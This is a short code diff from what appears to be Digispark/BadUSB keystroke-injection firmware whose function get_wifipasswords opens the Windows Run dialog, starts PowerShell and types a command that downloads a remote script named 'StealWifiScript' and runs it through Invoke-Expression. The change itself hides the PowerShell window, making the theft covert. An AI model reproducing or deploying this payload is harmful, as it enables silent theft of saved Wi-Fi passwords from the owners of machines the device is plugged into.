@@ -19,7 +19,7 @@ void get_wifipasswords() {
   //WIN+R (run)
   DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   my_delay(200);
-  DigiKeyboardFr.println("powershell.exe ");
+  DigiKeyboardFr.println("powershell.exe -W Hidden");
   my_delay(1000);
   DigiKeyboardFr.println("Invoke-WebRequest -Uri "StealWifiScript " -UseBasicParsing | Select-Object -ExpandProperty Content | Invoke-Expression");
   my_delay(5000); // wait untill powershell script finishes
